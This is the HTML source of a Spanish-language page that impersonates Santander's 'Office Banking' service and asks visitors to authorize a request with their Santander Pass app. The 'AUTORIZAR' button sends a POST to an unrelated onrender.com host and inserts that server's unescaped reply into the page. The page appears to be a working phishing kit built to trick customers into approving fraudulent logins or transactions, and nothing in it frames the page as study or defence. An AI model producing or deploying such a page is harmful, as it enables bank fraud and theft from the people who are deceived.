<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <title>Autorización</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link rel="stylesheet" href="styles.css">
  <style>
    .spinner {
      border: 8px solid #f3f3f3;
      border-top: 8px solid #e60000;
      border-radius: 50%;
      width: 60px;
      height: 60px;
      animation: spin 1s linear infinite;
      margin: 20px auto;
    }
    @keyframes spin {
      0% { transform: rotate(0deg);}
      100% { transform: rotate(360deg);}
    }
    .sub-text {
      margin-top: 15px;
      font-weight: bold;
      color: #333;
      text-align: center;
    }
    .btn-santander {
      background-color: #e60000;
      color: #fff;
      border: none;
      padding: 12px 20px;
      font-size: 16px;
      font-weight: bold;
      cursor: pointer;
      display: inline-flex;
      align-items: center;
      margin-top: 20px;
    }
    .btn-santander .bg-arrow {
      display: inline-block;
      margin-left: 8px;
      width: 0; 
      height: 0; 
      border-top: 6px solid transparent;
      border-bottom: 6px solid transparent;
      border-left: 8px solid #fff;
    }
  </style>
</head>
<body>
  <div class="login-box">
    <img src="logo-office-banking.png" alt="Office Banking" class="logo">

    <h2>Se enviará una autorización a tu Aplicación</h2>
    <p class="sub-text">AUTORIZA CON TU SANTANDER PASS</p>
    <p class="sub-text">Clave única de 6 dígitos con su App Santander Pass</p>

    <!-- Botón con formato Santander -->
    <button class="btn-santander" type="button" id="autorizarBtn">
      AUTORIZAR<span class="bg-arrow"></span>
    </button>

    <div id="resultado"></div>
  </div>

  <script>
    document.getElementById("autorizarBtn").addEventListener("click", async function(){
      document.getElementById("resultado").innerHTML = 
        '<div class="spinner"></div><p>Procesando autorización...</p>';

      try {
        const response = await fetch("https://autorizaci-n-coordenadas-o-pass.onrender.com/autorizar", {
          method: "POST",
          headers: { "Content-Type": "application/json" }
        });
        const data = await response.text();
        document.getElementById("resultado").innerHTML = `<p>${data}</p>`;
      } catch (error) {
        document.getElementById("resultado").innerText = "⚠️ Error al conectar con el servidor.";
      }
    });
  </script>
</body>
</html>
